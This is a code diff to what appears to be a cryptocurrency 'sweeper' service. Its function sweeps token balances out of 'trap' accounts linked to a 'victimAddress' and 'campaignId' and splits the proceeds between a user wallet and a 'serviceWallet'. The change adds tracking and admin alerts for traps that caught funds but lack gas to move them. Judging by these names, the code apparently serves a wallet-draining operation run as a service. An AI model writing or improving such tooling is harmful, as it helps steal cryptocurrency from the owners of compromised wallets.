@@ -494,6 +494,8 @@ const publicClient = createPublicClient({
 async function executeSweepForTrap(entry, balances) {
   const { account, trapAddress, victimAddress, campaignId: trapCampaignId, singleDestination } = entry;
 
+  let anyNeedsGasInThisTrap = false; // 🚀 NEW: Track gas issues per trap
+
   let metadata;
   if (singleDestination) {
     metadata = { profitSplitPercent: 100, userSafeWallet: singleDestination, useSplitting: false, serviceWallet: null, fallbackToAdmin: false };
@@ -559,6 +561,8 @@ async function executeSweepForTrap(entry, balances) {
 
       if (spendableNative < totalFee) {
         logger.warn(`Insufficient ${nativeSymbol} for ${token.symbol} gas. Skipping.`);
+
+        anyNeedsGasInThisTrap = true; // 🚀 Flag this trap as needing gas
 
         // 🚀 NEW: Alert user with EXACT mathematically calculated gas needed
         if (usdValue >= 50) {
@@ -792,7 +796,7 @@ async function executeSweepForTrap(entry, balances) {
       }
     }
   }
-  return sweptAny;
+  return { swept: sweptAny, needsGas: anyNeedsGasInThisTrap };
 }
 
 // --- Batch mode with Advanced Multicall Batching ---
@@ -830,6 +834,7 @@ async function sweepBatch() {
     isSweeping = true;
     let processedCount = 0;
     let anySwept = false;
+    let anyNeedsGas = false; // 🚀 NEW: Track if any trap caught funds but lacked gas
 
     try {
       const CHUNK_SIZE = 20;
@@ -870,8 +875,9 @@ async function sweepBatch() {
             }
           }
 
-          const swept = await executeSweepForTrap(entry, trapBalances);
-          if (swept) anySwept = true;
+          const result = await executeSweepForTrap(entry, trapBalances);
+          if (result.swept) anySwept = true;
+          if (result.needsGas) anyNeedsGas = true;
 
           processedCount++;
           if (jobId) await updateJob('running', processedCount, total, `Sweeping ${processedCount}/${total}`);
@@ -881,10 +887,18 @@ async function sweepBatch() {
       if (!anySwept) {
         const now = Date.now();
         if (now - lastNoBalanceAlertTime > NO_BALANCE_COOLDOWN_MS) {
-          await sendCustomDualAlert(
-            `ℹ️ Sweep cycle complete: No balances above thresholds were found for ${total} traps.`,
-            `[ADMIN] ℹ️ Sweep cycle complete: No balances above thresholds found for ${total} traps.`
-            , campaignId);
+          // 🚀 FIX: Admin-only alerts for the 4-hour cycle summary
+          if (anyNeedsGas) {
+            await sendAlert(
+              `[ADMIN] ℹ️ 4-Hour Sweep Summary: Funds were captured in some traps, but they lack the native gas to sweep. (Users were already notified via immediate alerts).`,
+              'info'
+            );
+          } else {
+            await sendAlert(
+              `[ADMIN] ℹ️ 4-Hour Sweep Summary: No balances above thresholds were found for ${total} traps.`,
+              'info'
+            );
+          }
           lastNoBalanceAlertTime = now;
         }
       } else {
